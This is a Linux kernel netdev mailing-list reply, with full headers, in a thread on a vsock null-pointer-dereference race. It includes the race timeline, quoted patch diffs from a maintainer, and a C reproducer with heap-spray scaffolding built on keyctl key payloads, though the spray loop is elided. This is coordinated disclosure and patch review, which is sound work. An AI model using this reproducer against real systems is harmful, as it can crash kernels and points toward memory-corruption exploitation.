Return-Path: <netdev+bounces-153048-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sy.mirrors.kernel.org (sy.mirrors.kernel.org [IPv6:2604:1380:40f1:3f00::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 387B19F6A67
	for <lists+netdev@lfdr.de>; Wed, 18 Dec 2024 16:51:34 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sy.mirrors.kernel.org (Postfix) with ESMTPS id F09BC7A1ACF
	for <lists+netdev@lfdr.de>; Wed, 18 Dec 2024 15:51:27 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 0970D1E9B09;
	Wed, 18 Dec 2024 15:51:25 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=theori.io header.i=@theori.io header.b="CC9CjAHI"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D28871C5CD5
	for <netdev@vger.kernel.org>; Wed, 18 Dec 2024 15:51:22 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1734537084; cv=none; b=PdSiWUAZHqhqYbY+QiO9DwG0Sd4PdaTyzbt2GRGPBzQLNPsb+j2kM6NSSsKel8smDDUBknMh8aNd9zzX1dAAa/hGP6eT9IvR+xHWwuKQpKSSbdhj7MZtQAxQqwEcb/Op6ldSOfHy+tzO/YMj7cuB7tFyz3lzfPDK2ZfcqffJaDI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1734537084; c=relaxed/simple;
	bh=vKSToiSLhmTwRai64uJTRLmJ47/l+aBpbZErinLEj3g=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=g1ZnOiTUJdC+zPOEg79/wITxrGGuDCN2MJb0OWYhUauo+WxsFflbibIUHQJHyJYqx2qrc4iebszfyZA+QpeDPmcEB6OkToLcZMX2BvPZA48YL85MXqLsN7MQobrMT+pBi6F8MyCLeBZF4mSocFvumAo5kr0Fasgu9iUpJt47XWg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=theori.io; spf=pass smtp.mailfrom=theori.io; dkim=pass (1024-bit key) header.d=theori.io header.i=@theori.io header.b=CC9CjAHI; arc=none smtp.client-ip=209.85.210.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=theori.io
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=theori.io
Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-7242f559a9fso8574998b3a.1
        for <netdev@vger.kernel.org>; Wed, 18 Dec 2024 07:51:22 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=theori.io; s=google; t=1734537082; x=1735141882; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=iEWLoJ1cZqVPKOm4+wArmTerslObV5nGyDcVdoLJcVg=;
        b=CC9CjAHITngGWdyOYlbZxhSQu5OW0Kct9Cghh2F3booGMXMqS68vCqEPy2EA2eRDXh
         Gg7owbhEolDN5sambVOhoqaxT1Lg8QnW9FtdtbASAk3vYvnyJU3eEb3vGVk0z2DWZOWp
         a5RQgRjDlHvPV8MgXQ7mfL6JjbWdmAAtlDtaQ=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1734537082; x=1735141882;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=iEWLoJ1cZqVPKOm4+wArmTerslObV5nGyDcVdoLJcVg=;
        b=VWhLrL9TK0UdjssRAAiStl15XFIrC46sTlLThj/o4BqHwqSAACXgqxcnHEpqVLCihy
         VQNUzsj8bMuDV0ckJnYeT8BFp3472hppNJfr50wySjESigY3Me2/kM3E9HbVvn6eGsxW
         0nP7HGaipMADQ40a+/OAoRjEfySqNubYPcQOXRBPRaOwLOoXjpxWoXyprMwt/atZUJ7v
         lyE7KR18fyt72hgYILMtbV9+CiBYOKWLobmohpV6RJxpMnQHCoXXuwVEu0MINkWzeAWx
         sB8IP9c44IO8VYkTsMn6wMAZ+4CNFI9iYZb9rxat1y4WlgwNvFeyyHFGpKWg31ZTny64
         YFqQ==
X-Forwarded-Encrypted: i=1; AJvYcCUtrDzt7Uub7vq1jaCe91kg/dOtqlkr08n/cJ2Zphn7eE5qrJHhZIgUm9FWXBKo0WHaFe6s63Y=@vger.kernel.org
X-Gm-Message-State: AOJu0YxVhP159K5GhMPtUzXXtuftFEC7WjvIDsGxCx7Ui4nxj6qnsl3O
	m+GA+0uL7KIZzlvaAcyoVl6Pf5XFhthM6VSViFUV9Phs6UanEna0nSVp4w6jgPQ=
X-Gm-Gg: ASbGncvZBDjMY5MWZxiIrRQXeZ8/n3kuywEWXK+IKqugh5ZBALWzUK5NVECJbp9wALo
	Fu6XYjCtONYZdrEeTXStWPlYxfBZqHqBeP6SdHsZp7cghE+2bZKXwZ/umZIFsEF66S8FK0ZTCHp
	yNm6MLtjNxoSiXYLZFotllLZ5OX/QcgdCaCz1PqY3jUL5BwFnTE0y9acN1YqoBfdtlFyQcVPCsr
	P9gKtiDl1Zs0agqGjIAUdkI8HhY5x7FokmG9dQu4duSNDItCWUB481lbmNG12NvlK18nA==
X-Google-Smtp-Source: AGHT+IGzKargL40J80eukxnNz3oeZ4Rde1G2gdGJiTCL0BnxcJqRGL4rHVd7OJr6IIrG1MPh1hJJAg==
X-Received: by 2002:a05:6a21:6da7:b0:1e4:8fdd:8c77 with SMTP id adf61e73a8af0-1e5b4603cc7mr5914783637.8.1734537081974;
        Wed, 18 Dec 2024 07:51:21 -0800 (PST)
Received: from v4bel-B760M-AORUS-ELITE-AX ([211.219.71.65])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-72918ad8f34sm8711036b3a.77.2024.12.18.07.51.18
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 18 Dec 2024 07:51:21 -0800 (PST)
Date: Wed, 18 Dec 2024 10:51:17 -0500
From: Hyunwoo Kim <v4bel@theori.io>
To: Stefano Garzarella <sgarzare@redhat.com>
Cc: "David S. Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>, Jason Wang <jasowang@redhat.com>,
	"Michael S. Tsirkin" <mst@redhat.com>,
	virtualization@lists.linux.dev, netdev@vger.kernel.org,
	qwerty@theori.io, imv4bel@gmail.com, v4bel@theori.io
Subject: Re: [PATCH] vsock/virtio: Fix null-ptr-deref in vsock_stream_has_data
Message-ID: <Z2LvdTTQR7dBmPb5@v4bel-B760M-AORUS-ELITE-AX>
References: <Z2K/I4nlHdfMRTZC@v4bel-B760M-AORUS-ELITE-AX>
 <lwfkm3salizjvubc5vqnkxi4bk4zdglg5um4xygfxwmrkktrbc@bvazoy4k723k>
 <Z2LZ3HK05RH8OfP5@v4bel-B760M-AORUS-ELITE-AX>
 <s2k74f6zvjm7uexqfyej6txvoqgf6lkaa47igo2eh4pq55d4n2@wnrrcr6aa6lk>
 <f7a3rlgpc36wk75grqeg6ndqmlprvilznlsesyruqfb7m5vrp7@myil7ex4f62n>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <f7a3rlgpc36wk75grqeg6ndqmlprvilznlsesyruqfb7m5vrp7@myil7ex4f62n>

On Wed, Dec 18, 2024 at 04:31:03PM +0100, Stefano Garzarella wrote:
> On Wed, Dec 18, 2024 at 03:40:40PM +0100, Stefano Garzarella wrote:
> > On Wed, Dec 18, 2024 at 09:19:08AM -0500, Hyunwoo Kim wrote:
> > > On Wed, Dec 18, 2024 at 02:40:49PM +0100, Stefano Garzarella wrote:
> > > > On Wed, Dec 18, 2024 at 07:25:07AM -0500, Hyunwoo Kim wrote:
> > > > > When calling connect to change the CID of a vsock, the loopback
> > > > > worker for the VIRTIO_VSOCK_OP_RST command is invoked.
> > > > > During this process, vsock_stream_has_data() calls
> > > > > vsk->transport->stream_has_data().
> > > > > However, a null-ptr-deref occurs because vsk->transport was set
> > > > > to NULL in vsock_deassign_transport().
> > > > > 
> > > > >                     cpu0                                                      cpu1
> > > > > 
> > > > >                                                               socket(A)
> > > > > 
> > > > >                                                               bind(A, VMADDR_CID_LOCAL)
> > > > >                                                                 vsock_bind()
> > > > > 
> > > > >                                                               listen(A)
> > > > >                                                                 vsock_listen()
> > > > >  socket(B)
> > > > > 
> > > > >  connect(B, VMADDR_CID_LOCAL)
> > > > > 
> > > > >  connect(B, VMADDR_CID_HYPERVISOR)
> > > > >    vsock_connect(B)
> > > > >      lock_sock(sk);
> 
> It shouldn't go on here anyway, because there's this check in
> vsock_connect():
> 
> 	switch (sock->state) {
> 	case SS_CONNECTED:
> 		err = -EISCONN;
> 		goto out;

By using a kill signal, set sock->state to SS_UNCONNECTED and sk->sk_state to 
TCP_CLOSING before the second connect() is called, causing the worker to 
execute without the SOCK_DONE flag being set.

> 
> 
> Indeed if I try, I have this behaviour:
> 
> shell1# python3
> import socket
> s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
> s.bind((1,1234))
> s.listen()
> 
> shell2# python3
> import socket
> s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
> s.connect((1, 1234))
> s.connect((2, 1234))
> Traceback (most recent call last):
>   File "<stdin>", line 1, in <module>
> OSError: [Errno 106] Transport endpoint is already connected
> 
> 
> Where 106 is exactly EISCONN.
> So, do you have a better reproducer for that?

The full scenario is as follows:
```
                     cpu0                                                      cpu1

                                                               socket(A)

                                                               bind(A, {cid: VMADDR_CID_LOCAL, port: 1024})
                                                                 vsock_bind()

                                                               listen(A)
                                                                 vsock_listen()
  socket(B)

  connect(B, {cid: VMADDR_CID_LOCAL, port: 1024})
    vsock_connect()
      lock_sock(sk);
      virtio_transport_connect()
        virtio_transport_connect()
          virtio_transport_send_pkt_info()
            vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_REQUEST)
              queue_work(vsock_loopback_work)
      sk->sk_state = TCP_SYN_SENT;
      release_sock(sk);
                                                               vsock_loopback_work()
                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_REQUEST)
                                                                   sk = vsock_find_bound_socket(&dst);
                                                                   virtio_transport_recv_listen(sk, skb)
                                                                     child = vsock_create_connected(sk);
                                                                     vsock_assign_transport()
                                                                       vvs = kzalloc(sizeof(*vvs), GFP_KERNEL);
                                                                     vsock_insert_connected(vchild);
                                                                       list_add(&vsk->connected_table, list);
                                                                     virtio_transport_send_response(vchild, skb);
                                                                       virtio_transport_send_pkt_info()
                                                                         vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_RESPONSE)
                                                                           queue_work(vsock_loopback_work)

                                                               vsock_loopback_work()
                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_RESPONSE)
                                                                   sk = vsock_find_bound_socket(&dst);
                                                                   lock_sock(sk);
                                                                   case TCP_SYN_SENT:
                                                                   virtio_transport_recv_connecting()
                                                                     sk->sk_state = TCP_ESTABLISHED;
                                                                   release_sock(sk);

                                                               kill(connect(B));
      lock_sock(sk);
      if (signal_pending(current)) {
      sk->sk_state = sk->sk_state == TCP_ESTABLISHED ? TCP_CLOSING : TCP_CLOSE;
      sock->state = SS_UNCONNECTED;
      release_sock(sk);

  connect(B, {cid: VMADDR_CID_HYPERVISOR, port: 1024})
    vsock_connect(B)
      lock_sock(sk);
      vsock_assign_transport()
        virtio_transport_release()
          virtio_transport_close()
            if (!(sk->sk_state == TCP_ESTABLISHED || sk->sk_state == TCP_CLOSING))
            virtio_transport_shutdown()
              virtio_transport_send_pkt_info()
                vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
                  queue_work(vsock_loopback_work)
        vsock_deassign_transport()
          vsk->transport = NULL;
        return -ESOCKTNOSUPPORT;
      release_sock(sk);
                                                               vsock_loopback_work()
                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
                                                                   virtio_transport_recv_connected()
                                                                     virtio_transport_reset()
                                                                       virtio_transport_send_pkt_info()
                                                                         vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_RST)
                                                                           queue_work(vsock_loopback_work)

                                                               vsock_loopback_work()
                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_RST)
								   virtio_transport_recv_disconnecting()
								     virtio_transport_do_close()
								       vsock_stream_has_data()
								         vsk->transport->stream_has_data(vsk);    // null-ptr-deref
```

And the reproducer I used is as follows, but since it’s a race condition, 
triggering it might take a long time depending on the environment. 
Therefore, it’s a good idea to add an mdelay to the appropriate vsock function:
```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <syscall.h>
#include <stdarg.h>
#include <sched.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/times.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <stddef.h>
#include <linux/types.h>
#include <stdint.h>
#include <linux/keyctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <syscall.h>
#include <stdarg.h>
#include <sched.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/times.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <stddef.h>

#define FAIL_IF(x) if ((x)) { \
        perror(#x); \
        return -1; \
}
#define SPRAY_ERROR 0
#define SPRAY_RETRY 1
#define SPRAY_SUCCESS 2

#define LAST_RESERVED_PORT 1023

#define NS_PER_JIFFIE 1000000ull

int cid_port_num = LAST_RESERVED_PORT;

void *trigger_stack = NULL;
void *heap_spray_stack = NULL;
volatile int status_spray = SPRAY_ERROR;

struct virtio_vsock_sock {
	void *vsk;
	int tx_lock;
	int rx_lock;
	int tx_cnt;
	int peer_fwd_cnt;
	int peer_buf_alloc;
	int fwd_cnt;
	int last_fwd_cnt;
	int rx_bytes;
	int buf_alloc;
	char pad[4];
	char rx_queue[24];
	int msg_count;
};
_Static_assert(sizeof(struct virtio_vsock_sock) == 80, "virtio_vsock_sock size missmatch");

union key_payload {
        struct virtio_vsock_sock vvs;
        struct {
                char header[24];
                char data[];
        } key;
};

#define MAIN_CPU 0
#define HELPER_CPU 1

inline static int _pin_to_cpu(int id)
{
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(id, &set);
        return sched_setaffinity(getpid(), sizeof(set), &set);
}

typedef int key_serial_t;

inline static key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
{
	return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

long keyctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
{
	return syscall(__NR_keyctl, option, arg2, arg3, arg4, arg5);
}

unsigned long long get_jiffies()
{
	return times(NULL) * 10;
}

int race_trigger(void *arg)
{
	struct sockaddr_vm connect_addr = {0};
	struct sockaddr_vm listen_addr = {0};
	pid_t conn_pid, listen_pid;

	int socket_a = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
	int socket_b = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

	cid_port_num++;

	connect_addr.svm_family = AF_VSOCK;
	connect_addr.svm_cid = VMADDR_CID_LOCAL;
	connect_addr.svm_port = cid_port_num;

	listen_addr.svm_family = AF_VSOCK;
	listen_addr.svm_cid = VMADDR_CID_LOCAL;
	listen_addr.svm_port = cid_port_num;
	bind(socket_a, (struct sockaddr *)&listen_addr, sizeof(listen_addr));

	listen(socket_a, 0);

	_pin_to_cpu(MAIN_CPU);

	conn_pid = fork();
	if (conn_pid == 0) {
		/*
		struct itimerspec it = {};
		int tfd;

		FAIL_IF((tfd = timerfd_create(CLOCK_MONOTONIC, 0)) < 0);
		unsigned long tmp;
		it.it_value.tv_sec = 0;
		it.it_value.tv_nsec = 1 * NS_PER_JIFFIE;
		FAIL_IF(timerfd_settime(tfd, 0, &it, NULL) < 0);

		read(tfd, &tmp, sizeof(tmp));
		*/

		connect(socket_b, (struct sockaddr *)&connect_addr, sizeof(connect_addr));
	} else {
		/*
		struct itimerspec it = {};
		int tfd;

		FAIL_IF((tfd = timerfd_create(CLOCK_MONOTONIC, 0)) < 0);
		unsigned long tmp;
		it.it_value.tv_sec = 0;
		it.it_value.tv_nsec = 1 * NS_PER_JIFFIE;
		FAIL_IF(timerfd_settime(tfd, 0, &it, NULL) < 0);

		read(tfd, &tmp, sizeof(tmp));
		*/

		kill(conn_pid, SIGKILL);
		wait(NULL);
	}

	connect_addr.svm_cid = 0;
	connect(socket_b, (struct sockaddr *)&connect_addr, sizeof(connect_addr));

	return 0;
}

int heap_spraying(void *arg)
{
	union key_payload payload = {};
	union key_payload readout = {};
	key_serial_t keys[256] = {};

	status_spray = SPRAY_ERROR;

	int race_trigger_pid = clone(race_trigger, trigger_stack, CLONE_VM | SIGCHLD, NULL);
	FAIL_IF(race_trigger_pid < 0);

	const size_t payload_size = sizeof(payload.vvs) - sizeof(payload.key.header);
	memset(&payload, '?', sizeof(payload));

	_pin_to_cpu(MAIN_CPU);

	unsigned long long begin = get_jiffies();
	do {
		// ...
	} while (get_jiffies() - begin < 25);

	status_spray = SPRAY_RETRY;

	return 0;
}

int main()
{
	srand(time(NULL));

	trigger_stack = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	FAIL_IF(trigger_stack == MAP_FAILED);
	trigger_stack += 0x8000;
	heap_spray_stack = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	FAIL_IF(heap_spray_stack == MAP_FAILED);
	heap_spray_stack += 0x8000;

	do {
		int spray_worker_pid = clone(heap_spraying, heap_spray_stack, CLONE_VM | SIGCHLD, NULL);
		FAIL_IF(spray_worker_pid < 0);
		FAIL_IF(waitpid(spray_worker_pid, NULL, 0) < 0);
	} while (status_spray == SPRAY_RETRY);

	return 0;
}
```

> 
> Would be nice to add a test in tools/testing/vsock/vsock_test.c
> 
> Thanks,
> Stefano
> 
> > > > >      vsock_assign_transport()
> > > > >        virtio_transport_release()
> > > > >          virtio_transport_close()
> > > > >            virtio_transport_shutdown()
> > > > >              virtio_transport_send_pkt_info()
> > > > >                vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
> > > > >                  queue_work(vsock_loopback_work)
> > > > >        vsock_deassign_transport()
> > > > >          vsk->transport = NULL;
> > > > >                                                               vsock_loopback_work()
> > > > >                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
> > > > >                                                                   virtio_transport_recv_connected()
> > > > >                                                                     virtio_transport_reset()
> > > > >                                                                       virtio_transport_send_pkt_info()
> > > > >                                                                         vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_RST)
> > > > >                                                                           queue_work(vsock_loopback_work)
> > > > > 
> > > > >                                                               vsock_loopback_work()
> > > > >                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_RST)
> > > > > 								   virtio_transport_recv_disconnecting()
> > > > > 								     virtio_transport_do_close()
> > > > > 								       vsock_stream_has_data()
> > > > > 								         vsk->transport->stream_has_data(vsk);    // null-ptr-deref
> > > > > 
> > > > > To resolve this issue, add a check for vsk->transport, similar to
> > > > > functions like vsock_send_shutdown().
> > > > > 
> > > > > Fixes: fe502c4a38d9 ("vsock: add 'transport' member in the struct vsock_sock")
> > > > > Signed-off-by: Hyunwoo Kim <v4bel@theori.io>
> > > > > Signed-off-by: Wongi Lee <qwerty@theori.io>
> > > > > ---
> > > > > net/vmw_vsock/af_vsock.c | 3 +++
> > > > > 1 file changed, 3 insertions(+)
> > > > > 
> > > > > diff --git a/net/vmw_vsock/af_vsock.c b/net/vmw_vsock/af_vsock.c
> > > > > index 5cf8109f672a..a0c008626798 100644
> > > > > --- a/net/vmw_vsock/af_vsock.c
> > > > > +++ b/net/vmw_vsock/af_vsock.c
> > > > > @@ -870,6 +870,9 @@ EXPORT_SYMBOL_GPL(vsock_create_connected);
> > > > > 
> > > > > s64 vsock_stream_has_data(struct vsock_sock *vsk)
> > > > > {
> > > > > +	if (!vsk->transport)
> > > > > +		return 0;
> > > > > +
> > > > 
> > > > I understand that this alleviates the problem, but IMO it is not the right
> > > > solution. We should understand why we're still processing the packet in the
> > > > context of this socket if it's no longer assigned to the right transport.
> > > 
> > > Got it. I agree with you.
> > > 
> > > > 
> > > > Maybe we can try to improve virtio_transport_recv_pkt() and check if the
> > > > vsk->transport is what we expect, I mean something like this (untested):
> > > > 
> > > > diff --git a/net/vmw_vsock/virtio_transport_common.c b/net/vmw_vsock/virtio_transport_common.c
> > > > index 9acc13ab3f82..18b91149a62e 100644
> > > > --- a/net/vmw_vsock/virtio_transport_common.c
> > > > +++ b/net/vmw_vsock/virtio_transport_common.c
> > > > @@ -1628,8 +1628,10 @@ void virtio_transport_recv_pkt(struct virtio_transport *t,
> > > > 
> > > >        lock_sock(sk);
> > > > 
> > > > -       /* Check if sk has been closed before lock_sock */
> > > > -       if (sock_flag(sk, SOCK_DONE)) {
> > > > +       /* Check if sk has been closed or assigned to another transport before
> > > > +        * lock_sock
> > > > +        */
> > > > +       if (sock_flag(sk, SOCK_DONE) || vsk->transport != t) {
> > > >                (void)virtio_transport_reset_no_sock(t, skb);
> > > >                release_sock(sk);
> > > >                sock_put(sk);
> > > > 
> > > > BTW I'm not sure it is the best solution, we have to check that we do not
> > > > introduce strange cases, but IMHO we have to solve the problem earlier in
> > > > virtio_transport_recv_pkt().
> > > 
> > > At least for vsock_loopback.c, this change doesn’t seem to introduce any
> > > particular issues.
> > 
> > But was it working for you? because the check was wrong, this one should
> > work, but still, I didn't have time to test it properly, I'll do later.
> > 
> > diff --git a/net/vmw_vsock/virtio_transport_common.c b/net/vmw_vsock/virtio_transport_common.c
> > index 9acc13ab3f82..ddecf6e430d6 100644
> > --- a/net/vmw_vsock/virtio_transport_common.c
> > +++ b/net/vmw_vsock/virtio_transport_common.c
> > @@ -1628,8 +1628,10 @@ void virtio_transport_recv_pkt(struct virtio_transport *t,
> >        lock_sock(sk);
> > -       /* Check if sk has been closed before lock_sock */
> > -       if (sock_flag(sk, SOCK_DONE)) {
> > +       /* Check if sk has been closed or assigned to another transport before
> > +        * lock_sock
> > +        */
> > +       if (sock_flag(sk, SOCK_DONE) || vsk->transport != &t->transport) {
> >                (void)virtio_transport_reset_no_sock(t, skb);
> >                release_sock(sk);
> >                sock_put(sk);
> > 
> > > 
> > > And separately, I think applying the vsock_stream_has_data patch would help
> > > prevent potential issues that could arise when vsock_stream_has_data is
> > > called somewhere.
> > 
> > Not sure, with that check, we wouldn't have seen this problem we had, so
> > either add an error, but mute it like this I don't think is a good idea,
> > also because the same function is used in a hot path, so an extra check
> > could affect performance (not much honestly in this case, but adding it
> > anywhere could).
> > 
> > Thanks,
> > Stefano
> > 
> > > 
> > > > 
> > > > Thanks,
> > > > Stefano
> > > > 
> > > > > 	return vsk->transport->stream_has_data(vsk);
> > > > > }
> > > > > EXPORT_SYMBOL_GPL(vsock_stream_has_data);
> > > > > --
> > > > > 2.34.1
> > > > > 
> > > > 
> > > 
> 

